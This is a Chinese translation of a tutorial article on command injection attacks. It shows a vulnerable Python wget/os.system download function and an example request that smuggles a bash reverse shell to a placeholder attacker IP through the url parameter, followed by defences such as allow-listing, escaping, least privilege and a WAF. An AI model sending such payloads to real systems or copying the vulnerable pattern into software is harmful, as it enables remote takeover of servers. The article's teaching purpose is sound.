# 了解命令注入攻击

> 原文：<https://betterprogramming.pub/learn-about-command-injection-attacks-1cd0d178fe65>

## 当攻击者可以在您的机器上执行他们的代码时

![](img/81c0186691c8a85c09018f1b02d2f904.png)

由[凯文·霍尔瓦特](https://unsplash.com/@hidd3n?utm_source=medium&utm_medium=referral)在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄

远程代码执行漏洞是当攻击者能够在您的机器上执行他们的代码时发生的一类漏洞。发生这种情况的方式之一是通过命令注入漏洞。它们是一种远程代码执行，当用户输入直接连接到系统命令时就会发生。

假设您的网站有一项功能，允许用户下载远程文件并在您的网站上查看。为了实现这个功能，您的应用程序使用系统命令`wget`来下载远程文件。

这就是你的 python 源代码的样子。`os.system()` Python 函数将其输入字符串作为系统命令执行。

```
import osdef download(url):
  os.system(“wget -O- {}”.format(url))display(download(user_input.url))
```

Wget 是一个给定 URL 下载网页的工具，`-O-`选项让 Wget 下载文件并在标准输出中显示。所以这个程序从用户输入中获取一个 URL，并将其传递给使用`os.system()`执行的 Wget 命令。例如，如果你提交这个请求，应用程序将下载 Google 主页的源代码并显示给你。

```
GET /download?url=google.com
Host: example.com
```

在这种情况下，系统命令变成:

```
wget -O- google.com
```

在 Linux 命令行中，分号“；”字符可以用来分隔各个命令。攻击者可以在 Wget 命令后执行任意命令，方法是在分号“；”后提交他们想要的任何命令人品！该输入将导致应用程序在端口 8080 上生成一个返回攻击者 IP 的反向外壳。

```
GET /download?url=”google.com;bash -i >& /dev/tcp/attacker_ip/8080 0>&1"
Host: example.com
```

在这种情况下，系统命令变成:

```
wget -O- google.com;bash -i >& /dev/tcp/attacker_ip/8080 0>&1
```

反向外壳使目标服务器与攻击者的机器通信，并建立可远程访问的用户界面，使得攻击者能够执行任何系统命令。

# **防止命令注入**

如您所见，命令注入会导致您的应用程序和运行 web 服务器的用户帐户完全受损。如何防止这些危险的漏洞？

首先，您可以通过不使用用户提供的输入运行系统命令来防止命令注入。如果您需要在系统命令中使用用户输入，请避免直接调用操作系统命令。相反，您可以尝试使用具有相同用途的内置库函数。例如，不使用`os.system(“mkdir /dir_name”)`，可以使用 python OS 库中的`os.mkdir(“/dir_name”)`。由于用户输入可以通过应用程序解析的文件传递到评估的代码中，因此您应该将用户上传的文件视为不可信文件，并保护程序执行、解析或包含的现有系统文件的完整性。

或者，您可以为传递给命令的输入实现强输入验证。最好的方法是通过白名单。您可以将字符串或允许的字符列入白名单。例如，当您希望用户能够执行任意命令时，您可以将允许用户运行的命令列入白名单，例如`ls`和`pwd`，并且只允许那些输入字符串。

当这不可能时，您可以将允许的字符列入白名单。例如，这个正则表达式只允许小写字母和数字，不允许任何可用于操作命令逻辑的特殊字符。输入字符串的长度也被限制为 1-10 个字符。

```
^[a-z0–9]{1,10}$
```

最后，您也可以对插入到 OS 命令中的值进行转义。例如，应该转义的一些危险字符包括:

```
& | ; $ > < ` \ !
```

但这通常不太有效，因为攻击者不断想出创新的方法来绕过基于黑名单的输入验证。

如果所有其他方法都失败了，并且攻击者确实在您的机器上实现了命令注入，那么您如何才能将他们可能造成的危害最小化呢？在系统上运行任意命令意味着几乎可以完全访问该应用程序的权限。因此，如果您限制您的应用程序在您的系统上可以做什么，使用该应用程序的单个命令注入将不会对您的系统造成严重损害。

“最小特权原则”规定，应用程序和进程只应被授予完成其任务所需的特权。这是降低攻击过程中系统受损风险的最佳做法，因为攻击者不会获得敏感文件和操作的访问权限，即使他们损害了低特权用户或进程。例如，当 web 应用程序只需要对文件进行读取访问时，就不应该授予它任何写入或执行权限。因为如果攻击者劫持了以高特权运行的应用程序，攻击者就可以获得它的权限。在这种情况下，您应该限制运行 web 服务器的用户的权限，这样攻击者就不能使用它来危害整个系统。

最后，您应该及时更新补丁，以防止应用程序的依赖关系引入命令注入漏洞。您还可以部署 web 应用程序防火墙(WAF)来阻止可疑的攻击。

今天的安全课到此结束！下次见！